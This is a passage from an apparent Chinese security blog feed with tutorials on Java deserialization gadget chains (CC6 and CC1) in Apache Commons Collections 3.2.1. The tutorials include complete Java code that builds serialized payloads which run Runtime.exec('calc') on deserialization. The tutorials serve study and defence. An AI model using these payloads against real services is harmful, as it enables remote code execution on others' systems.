    <summary type="html">&lt;h5 id=&quot;CC3&quot;&gt;&lt;a href=&quot;#CC3&quot; class=&quot;headerlink&quot; title=&quot;CC3&quot;&gt;&lt;/a&gt;CC3&lt;/h5&gt;&lt;p&gt;前面链子都是命令执行，但很多时候服务器的黑名单会选择禁用 &lt;code&gt;Runtime&lt;/code&gt;，因此CC3用到&lt;strong&gt;动</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="Common Collections" scheme="https://micgo.top/tags/Common-Collections/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化——CC6链</title>
    <link href="https://micgo.top/java-security/CC6/"/>
    <id>https://micgo.top/java-security/CC6/</id>
    <published>2023-03-11T16:00:00.000Z</published>
    <updated>2023-03-12T12:13:23.888Z</updated>
    
    <content type="html"><![CDATA[<h5 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h5><p>在Java高版本,因为官方修改了AnnotationInvocationHandler的readObject方法，导致CC1无法在高版本的使用，cc6的出现就是为了解决高版本的利用问题。CC6<strong>不受 jdk 版本制约</strong>，用一句话介绍一下就是 <strong>CC6 &#x3D; CC1 + URLDNS</strong> 即LazyMap版CC1的后半部分加上URLDNS的前半部分(HashMap)</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312141032952.png" alt="image-20230312141032952" style="zoom: 50%;" /><p>找到<code>TiedMapEntry</code>类中的<code>getValue()</code>方法调用了<code>LazyMap</code>的<code>get()</code>方法</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312141113959.png" alt="image-20230312141113959" style="zoom:52%;" /><p>接下来寻找调用getValue的地方，寻找的方法也略提一嘴，因为<code>getValue()</code>这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况 。这里寻找到同名函数下的<code>hashCode()</code>方法调用了<code>getValue()</code>方法</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312142720290.png" alt="image-20230312142720290" style="zoom:53%;" /><p>如果在实战里面，在链子中找到了<code>hashCode()</code>方法，说明我们的构造已经可以提前庆祝了</p><p>我们去找谁调用了<code>hashCode()</code>方法，在 Java 反序列化当中，找到<code>hashCode()</code>之后的链子用的基本都是这一条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --自动调用--&gt;  HashMap.hash()</span><br><span class="line">后续利用链.hashCode()</span><br></pre></td></tr></table></figure><p>更巧的是， HashMap 类本身就是一个非常完美的<strong>入口类</strong></p><p>正如之前URLDNS链分析的一样，这条链子还有点问题：序列化的时候执行put()方法就已经执行命令</p><p>我们得先不让其进行命令执行，在反序列化的时候再命令执行。可以任意修改transformers、chainedTransformer、lazyMap</p><p>这里我们修改lazyMap，lazyMap中之前传进去的参数是<code>chainedTransformer</code>，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回<code>chainedTransformer</code></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312142047275.png" alt="image-20230312142047275"></p><p>还有就是map2调用put()的时候会增加个key，put完要删掉，不然反序列化的时候key值存在就不会进行transform方法了</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312201257119.png" alt="image-20230312201257119" style="zoom:80%;" /><p>用lazyMap.remove(“key”) 或者 lazyMap.clear() 都可以</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312200612968.png" alt="image-20230312200612968"></p><p>构造完成，成功执行</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312135601931.png" alt="image-20230312135601931"></p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//第二个参数任意，因为后面反射会修改</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;CC6&quot;&gt;&lt;a href=&quot;#CC6&quot; class=&quot;headerlink&quot; title=&quot;CC6&quot;&gt;&lt;/a&gt;CC6&lt;/h5&gt;&lt;p&gt;在Java高版本,因为官方修改了AnnotationInvocationHandler的readObject方法，导致CC1无法在高</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="Common Collections" scheme="https://micgo.top/tags/Common-Collections/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化——CC1链</title>
    <link href="https://micgo.top/java-security/CC1/"/>
    <id>https://micgo.top/java-security/CC1/</id>
    <published>2023-03-10T16:00:00.000Z</published>
    <updated>2023-03-19T14:19:27.572Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common-Collections"></a>Common-Collections</h4><p> 相关介绍</p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）</p><p>Common-Collections 这个项目开发出来是为了给 Java 标准的<code>Collections API</code>提供了相当好的补充,在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。在开发应用程序的过程中，既保证了性能，同时也能大大简化代码</p><p><strong>包结构介绍</strong></p><ul><li><code>org.apache.commons.collections</code>– CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code>– 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code>– 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code>– 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code>–实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code>–Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code>– 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code>– 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code>– 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code>– 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code>– 实现Set系列接口的一组类</li></ul><h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a><strong>环境配置</strong></h5><p>下载 <a href="https://download.oracle.com/otn/java/jdk/8u65-b17/jdk-8u65-windows-i586.exe">jdk8u65</a></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310140128772.png" alt="image-20230310140128772" style="zoom: 67%;" /><p>创建一个 IDEA 项目，选中 maven，并使用 jdk8u65</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310143042613.png" alt="image-20230310143042613" style="zoom:50%;" /><p>在添加 Maven 中，对 CC1 链的依赖包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310143112331.png" alt="image-20230310143112331" style="zoom:35%;" /><p>我们 import CC 的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br></pre></td></tr></table></figure><p>如果成功说明安装成功了 </p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310143237052.png" alt="image-20230310143237052" style="zoom:50%;" /><p>我们还要做一件事，修改 sun 包。</p><p>因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件</p><p>去<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a>下载 zip 文件</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310143452386.png" alt="image-20230310143452386" style="zoom: 50%;" /><p>将其解压之后，先搁一边，我们解压 jdk8u65 的 src.zip，解压完之后，我们把 openJDK 8u65 解压出来的 sun 文件夹拷贝进 jdk8u65 中，这样子就能把 .class 文件转换为 .java 文件了</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310143935573.png" alt="image-20230310143935573" style="zoom: 50%;" /><p>在idea中把src目录加进去</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311111812748.png" alt="image-20230311111812748" style="zoom:38%;" /><h5 id="TransformMap版CC1链分析"><a href="#TransformMap版CC1链分析" class="headerlink" title="TransformMap版CC1链分析"></a>TransformMap版CC1链分析</h5><p>CC1链有两种构造方法，先来<strong>TransformMap版CC1攻击链分析</strong></p><p>首先我们再次明确一下反序列化的攻击思路:</p><p>入口类这里，我们需要一个<code>readObject</code>方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310105046210.png" alt="image-20230310105046210" style="zoom: 45%;" /><ol><li>寻找尾部的 exec 方法</li></ol><ul><li>总结出前人挖洞的思路，我们这里加速，去到 Transformer 接口看一看</li></ul><p>快捷键 ctrl + alt + B，查看实现接口的类</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310152243916.png" alt="image-20230310152243916" style="zoom:40%;" /><p>我先是寻找了<code>MapTransformer</code>，再寻找了<code>InvokerTransformer</code>成功找到了我们需要的尾部 — 命令执行，在<code>InvokerTransformer</code>类中存在一个反射调用任意类，可以作为我们链子的终点</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310152452823.png" alt="image-20230310152452823" style="zoom:57%;" /><p>看到这里有漏洞，我们构造一下，调用这个类弹计算器</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310153841774.png" alt="image-20230310153841774" style="zoom: 39%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeTransformerTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span>      <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> invokerTransformer.transform(runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230310154009247.png" alt="image-20230310154009247" style="zoom: 33%;" /><p>注意我们最后一句 <code>invokerTransformer.transform(runtime); </code> 所以我们下一步目标是找调用<code>transform</code>方法的不同名函数</p><p>右键find usages查看调用transform的地方</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311083846709.png" alt="image-20230311083846709" style="zoom: 40%;" /><p>要是只显示了一处调用的话， ctrl + alt + shift + f7 + (fn)  把更改为project file改为All Places</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311092135983.png" alt="image-20230311092135983" style="zoom:50%;" /><p>得到21处results</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311092300138.png" alt="image-20230311092300138"></p><p>其中TransformedMap类中存在<code>checkSetValue()</code>方法调用了<code>transform()</code>方法</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311120939429.png" alt="image-20230311120939429"></p><p><code>TransformedMap</code>的构造方法作用域是<code>protected</code>，我们还需要去找谁调用了<code>TransformedMap</code>的构造方法，发现在<code>decorate()</code>静态方法中创建了<code>TransformedMap</code>对象</p><p>只有一处地方调用了checkSetValue方法，在AbstractInputCheckedMapDecorator类中的setValue方法</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311120843545.png" alt="image-20230311120843545" style="zoom:40%;" /><p>再找调用setValue方法的地方，这里调用setValue的地方有点多，一个一个找有点麻烦，我们尝试理解一下这个类，AbstractInputCheckedMapDecorator是TransformedMap的子类</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311104509262.png" alt="image-20230311104509262" style="zoom:67%;" /><p>在map中一个键值对就是一个entry，我们遍历Transformed中的map时就会调用AbstractInputCheckedMapDecorator中的setValue方法，进而调用checkSetValue</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311105329600.png" alt="image-20230311105329600" style="zoom: 50%;" /><p>构造一下代码</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311110227504.png" alt="image-20230311110227504"></p><p>至此利用链成功一半了</p><p>现在要找一个entry遍历数组，里面调用setValue方法，传进去的值可控。理想状态是找到一个readObject方法，诶还真找到了</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311112108777.png" alt="image-20230311112108777"></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311113004872.png" alt="image-20230311113004872" style="zoom: 43%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311112733689.png" alt="image-20230311112733689" style="zoom:53%;" /><p>找到<code>AnnotationInvocationHandler</code>，这个类完美地符合我们的预期。<code>InvocationHandler</code>这个后缀，是用做<strong>动态代理中间处理</strong>，因为它继承了<code>InvocationHandler</code>接口</p><p>要注意这个类的访问权限不是public，只能在这个包里访问，因此要通过反射获取这个类</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311114417280.png" alt="image-20230311114417280"></p><p>至此流程就设计好了，但是还有几个问题</p><p>1.Runtime对象是我们自己生成的，没继承Serializable接口不能序列化</p><p>2.setValue的值貌似不可控</p><p>3.两个if条件要满足</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311115952639.png" alt="image-20230311115952639" style="zoom:50%;" /><p>先来解决Runtime：</p><p><code>Runtime</code>是不能序列化的，但是<code>Runtime.class</code>是可以序列化的，下面是反射的Runtime</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311174515891.png" alt="image-20230311174515891" style="zoom:50%;" /><p>接着，我们将这个反射的<code>Runtime</code>改造为使用<code>InvokerTransformer</code>调用的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311180220868.png" alt="image-20230311180220868"></p><p>可以看到都是后一个调用前一个，transformer循环调用，与ChainedTransfomer功能一致，转换成ChainedTransfomer版本</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311181000797.png" alt="image-20230311181000797"></p><p>下面这样运行是调用不成功的</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311181738432.png" alt="image-20230311181738432"></p><p>下断点跟进一下，发现我们的第一个if条件不满足，直接步过了</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311205756422.png" alt="image-20230311205756422"></p><p>因此思考怎样传值能满足if条件</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311212118441.png" alt="image-20230311212118441" style="zoom:60%;" /><p>Override中没有成员方法，找不到和key同名的成员方法，故不满足</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311212259379.png" alt="image-20230311212259379" style="zoom: 50%;" /><p>换Target类</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311212346815.png" alt="image-20230311212346815" style="zoom:67%;" /><p>有个名为value的成员方法，满足，我们只需要传key&#x3D;”value”即可</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311212538784.png" alt="image-20230311212538784"></p><p>这个时候能走到第二个if条件了</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311213049534.png" alt="image-20230311213049534" style="zoom:60%;" /><p>但是控制不了第二个if条件中setValue方法的参数value的值，如果能控制的话结合之前推的链就能成功利用了</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311213635193.png" alt="image-20230311213635193"></p><p>我们需要找到一个类，能够可控<code>setValue</code>的参数，这里找到的是<code>ConstantTransformer</code> 类，完美符合预期，只要初始构造函数传入我们想要的值，最后transform方法无论传入什么都返回我们构造函数传入的值，上面setValue最后的值没有丝毫影响！</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311215207484.png" alt="image-20230311215207484"></p><p>我们先传入一个<code>Runtime.class</code>，然后无论<code>transform()</code>方法会调用什么对象，都会返回<code>Runtime.class</code></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311215606419.png" alt="image-20230311215606419"></p><p>至此整条链分析完毕，成功执行！</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311215650975.png" alt="image-20230311215650975"></p><p>总结一下我们的利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer#transform</span><br><span class="line">    TransformedMap#checkSetValue</span><br><span class="line">        AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">            AnnotationInvocationHandler#readObject</span><br></pre></td></tr></table></figure><p>使用到的工具类辅助利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure><p>流程图</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311220249733.png" alt="image-20230311220249733"></p><p>整体代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 